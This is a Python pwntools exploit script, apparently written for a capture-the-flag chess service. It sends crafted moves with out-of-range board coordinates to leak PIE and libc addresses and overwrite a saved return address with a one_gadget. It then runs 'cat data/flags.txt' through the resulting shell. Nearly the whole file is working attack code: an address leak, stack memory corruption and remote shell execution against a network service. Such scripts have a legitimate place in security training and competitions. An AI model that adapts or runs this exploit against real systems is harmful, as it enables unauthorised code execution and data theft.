#!/usr/bin/env python3
from pwn import *
import hmac


def generate_flag():
    flag = "".join(
        random.choice(string.ascii_uppercase + string.digits) for _ in range(21)
    )
    sig = (
        hmac.new("such-secret-such-key".encode(), flag.encode(), hashlib.sha1)
        .hexdigest()[:10]
        .upper()
    )
    return flag + sig + "="


def connect():
    if args.LOCAL:
        return gdb.debug(["stdbuf", "-i0", "-e0", "-o0", "./chess.dbg"], api=True)
    else:
        return remote(sys.argv[1], 3255)


def login(tube, name, password):
    tube.sendlineafter("Enter your name:", name)
    tube.sendlineafter("Enter your password:", password)


def recv_board(tube):
    rows = []
    tube.recvuntil("   A B C D E F G H\n")
    for i in range(8):
        prefix = f"{8 - i}  ".encode()
        assert tube.recvn(len(prefix)) == prefix
        row = tube.recvn(15).replace(b" ", b"")
        assert len(row) == 8, row
        suffix = f"  {8 - i}\n".encode()
        assert tube.recvn(len(suffix)) == suffix
        rows = [row] + rows
    assert tube.recvline() == b"   A B C D E F G H\n"
    return rows


def make_move_recv(tube):
    tube.recvuntil("Enter your move (e.g. e2-e4):")


def make_move_gen(s):
    if not isinstance(s, bytes):
        s = s.encode()
    return s.ljust(31, b"\x00")


def make_move(tube, s):
    make_move_recv(tube)
    tube.send(make_move_gen(s))
    line = tube.recvline()
    if line == b"Bad move\n":
        return False
    tube.unrecv(line)
    return True


BOARD_OFFSET = -0x78  # relative to main's initial stack
RIP_OFFSET = -0x38  # make_move -> main + 270, relative to board
# a4294967290: <main+249>
# a4294967291: 0
# a4294967292: 0
# a4294967293: move qword[0]
# a4294967294: move qword[1]
# a4294967295: move qword[2]
# a0: move qword[3]
LIBC_START_MAIN_OFFSET = 0x270B3
ONE_GADGET_OFFSET = 0xE6C81


def dump_stack(tube, main_rsp, offset, size):
    return b"".join(tube.gdb.selected_inferior().read_memory(main_rsp + offset, size))


def dump_board(tube, main_rsp):
    return dump_stack(tube, main_rsp, BOARD_OFFSET, 0x40)


def gen_moves(moves):
    return b"".join(map(make_move_gen, moves))


def recv_moves(tube, moves):
    boards = []
    for i in range(len(moves)):
        make_move_recv(tube)
        boards.append(recv_board(tube))
    return boards


CLEAR_1_2_WHITE_MOVES = tuple(
    f"{x}2-{x}4" if (i & 8) == 0 else f"{x}4-{x}5"
    for i in range(16)
    for x in (chr(ord("a") + (i & 7)),)
) + (
    "a1-a4",
    "b1-a3",
    "c1-e3",
    "d1-d4",
    "e1-e2",
    "e2-f3",
    "f3-e4",
    "f1-d3",
    "h1-h4",
    "g1-h3",
)


def gen_one_gadget_moves(one_gadget):
    is_white = True


def main():
    with connect() as tube:
        if args.LOCAL:
            tube.gdb.execute("set pagination off")
            tube.gdb.Breakpoint("main")
            tube.gdb.continue_and_wait()
            # stdbuf's main()
            tube.gdb.continue_and_wait()
            main_rsp = int(tube.gdb.parse_and_eval("$rsp"))
            print(f"main_rsp = 0x{main_rsp:x}")
            tube.gdb.Breakpoint("alarm")
            tube.gdb.continue_and_wait()
            tube.gdb.execute("set $pc=main+0x8e")  # ret
            tube.gdb.continue_nowait()
        login(tube, generate_flag(), generate_flag())
        print(recv_board(tube))

        # Make room for fake knights in row 1.
        moves = []
        for i, white_move in enumerate(CLEAR_1_2_WHITE_MOVES):
            moves.append(white_move)
            if i % 2 == 0:
                moves.append("b8-c6")
            else:
                moves.append(f"c6-b8")
        # Use fake knights to leak PIE and libc.
        for i, offset in enumerate(b"\x49\x4a\x4b\x4c\x4d\xf9\xfa\xfb\xfc\xfd"):
            moves.append("a3-c4")
            fake_from = "a4294967295"
            fake_to = "b1"
            moves.append(
                flat(
                    {0: f"{fake_from}-{fake_to}", 16: bytes((offset,))}, filler=b"\x00"
                )
            )
            moves.append("c4-a3")
            moves.append(flat({0: f"{fake_to}-{fake_from}", 16: bytes((0,))}))
        tube.send(gen_moves(moves))
        boards = recv_moves(tube, moves)
        pie = (
            struct.unpack(
                "<Q",
                bytes(
                    (
                        0xF8,
                        boards[-39][0][1],
                        boards[-35][0][1],
                        boards[-31][0][1],
                        boards[-27][0][1],
                        boards[-23][0][1],
                        0,
                        0,
                    )
                ),
            )[0]
            - 0x11F8
        )
        print(f"pie = 0x{pie:x}")
        assert pie & 0xFFF == 0
        libc = (
            struct.unpack(
                "<Q",
                bytes(
                    (
                        LIBC_START_MAIN_OFFSET & 0xFF,
                        boards[-19][0][1],
                        boards[-15][0][1],
                        boards[-11][0][1],
                        boards[-7][0][1],
                        boards[-3][0][1],
                        0,
                        0,
                    )
                ),
            )[0]
            - LIBC_START_MAIN_OFFSET
        )
        print(f"libc = 0x{libc:x}")
        assert libc & 0xFFF == 0
        one_gadget = libc + ONE_GADGET_OFFSET
        print(f"one_gadget = 0x{one_gadget:x}")

        assert make_move(tube, "b5-b6")
        assert make_move(tube, "b8-c6")
        assert make_move(tube, "e4-f4")

        is_white = False
        is_white_a3 = True
        is_black_b8 = False

        def make_filler_move():
            nonlocal is_white
            nonlocal is_white_a3
            nonlocal is_black_b8
            if is_white:
                if is_white_a3:
                    assert make_move(tube, "a3-c4")
                else:
                    assert make_move(tube, "c4-a3")
                is_white_a3 = not is_white_a3
            else:
                if is_black_b8:
                    assert make_move(tube, "b8-c6")
                else:
                    assert make_move(tube, "c6-b8")
                is_black_b8 = not is_black_b8
            is_white = not is_white
            for row in recv_board(tube):
                print(row)

        b = one_gadget & 0xFF
        print(f"b = 0x{b:02x}")
        if (b & 8 == 8) == is_white:
            make_filler_move()
        assert make_move(
            tube, flat({0: "a4294967295-b1", 16: bytes((b,))}, filler=b"\x00")
        )
        is_white = not is_white
        make_filler_move()
        assert make_move(tube, "b1-c3")
        is_white = not is_white
        make_filler_move()
        assert make_move(tube, "c3-b5")
        is_white = not is_white
        make_filler_move()
        assert make_move(tube, "b5-a7")
        is_white = not is_white
        make_filler_move()
        assert make_move(tube, "a2147483655-b2147483657")
        is_white = not is_white
        make_filler_move()
        assert make_move(tube, "b2147483657-a2147483659")
        is_white = not is_white
        make_filler_move()
        assert make_move(tube, "a2147483659-c2147483660")
        is_white = not is_white
        make_filler_move()
        if not make_move(tube, "c2147483660-b2147483662"):
            assert make_move(tube, "b2147483662-d2147483663")
            is_white = not is_white
            make_filler_move()
            assert make_move(tube, "c2147483660-b2147483662")
        is_white = not is_white
        make_filler_move()
        if not make_move(tube, "b2147483662-a2147483664"):
            assert make_move(tube, "a2147483664-c2147483663")
            is_white = not is_white
            make_filler_move()
            assert make_move(tube, "b2147483662-a2147483664")
        is_white = not is_white

        b = (one_gadget >> 8) & 0xFF
        print(f"b = 0x{b:02x}")
        if (b & 8 == 8) == is_white:
            make_filler_move()
        assert make_move(
            tube, flat({0: "a4294967295-b1", 16: bytes((b,))}, filler=b"\x00")
        )
        is_white = not is_white
        make_filler_move()
        assert make_move(tube, "b1-c3")
        is_white = not is_white
        make_filler_move()
        assert make_move(tube, "c3-b5")
        is_white = not is_white
        make_filler_move()
        assert make_move(tube, "b5-a7")
        is_white = not is_white
        make_filler_move()
        assert make_move(tube, "a2147483655-b2147483657")
        is_white = not is_white
        make_filler_move()
        assert make_move(tube, "b2147483657-a2147483659")
        is_white = not is_white
        make_filler_move()
        assert make_move(tube, "a2147483659-c2147483660")
        is_white = not is_white
        make_filler_move()
        assert make_move(tube, "c2147483660-b2147483662")
        is_white = not is_white
        make_filler_move()
        assert make_move(tube, "b2147483662-d2147483663")
        is_white = not is_white
        make_filler_move()
        assert make_move(tube, "d2147483663-b2147483664")
        is_white = not is_white
        make_filler_move()

        b = (one_gadget >> 16) & 0xFF
        print(f"b = 0x{b:02x}")
        if (b & 8 == 8) == is_white:
            make_filler_move()
        assert make_move(
            tube, flat({0: "a4294967295-b1", 16: bytes((b,))}, filler=b"\x00")
        )
        is_white = not is_white
        make_filler_move()
        assert make_move(tube, "b1-c3")
        is_white = not is_white
        make_filler_move()
        assert make_move(tube, "c3-b5")
        is_white = not is_white
        make_filler_move()
        assert make_move(tube, "b5-a7")
        is_white = not is_white
        make_filler_move()
        assert make_move(tube, "a2147483655-b2147483657")
        is_white = not is_white
        make_filler_move()
        assert make_move(tube, "b2147483657-a2147483659")
        is_white = not is_white
        make_filler_move()
        if not make_move(tube, "a2147483659-b2147483661"):
            assert make_move(tube, "b2147483661-d2147483660")
            is_white = not is_white
            make_filler_move()
            assert make_move(tube, "a2147483659-b2147483661")
        is_white = not is_white
        make_filler_move()
        assert make_move(tube, "b2147483661-a2147483663")
        is_white = not is_white
        make_filler_move()
        if not make_move(tube, "a2147483663-c2147483664"):
            assert make_move(tube, "c2147483664-e2147483663")
            is_white = not is_white
            make_filler_move()
            assert make_move(tube, "a2147483663-c2147483664")
        is_white = not is_white

        if is_white:
            make_filler_move()
        assert make_move(tube, "f7-f6")
        for row in recv_board(tube):
            print(row)
        assert make_move(tube, "h5-h6")
        for row in recv_board(tube):
            print(row)
        assert make_move(tube, "a8-a7")
        for row in recv_board(tube):
            print(row)
        assert make_move(tube, "h6-g7")
        for row in recv_board(tube):
            print(row)
        assert make_move(tube, "a7-a8")
        for row in recv_board(tube):
            print(row)
        assert make_move(tube, "d3-e2")
        for row in recv_board(tube):
            print(row)
        assert make_move(tube, "a8-a7")
        for row in recv_board(tube):
            print(row)
        assert make_move(tube, "e2-h5")
        for row in recv_board(tube):
            print(row)

        tube.sendline('cat data/flags.txt')
        tube.sendline('exit')
        print(tube.recvall())

        if False:
            tube.gdb.interrupt_and_wait()
            print(dump_board(tube, main_rsp).hex())
            tmp1 = 0xB0
            print(
                tube.gdb.execute(
                    f"x/{(tmp1 + BOARD_OFFSET) // 8}a 0x{main_rsp - tmp1:x}",
                    to_string=True,
                )
            )
            print(tube.gdb.execute(f"x/8a 0x{main_rsp - 0x38:x}", to_string=True))
            tube.gdb.continue_nowait()
            print(tube.recvall())


if __name__ == "__main__":
    main()
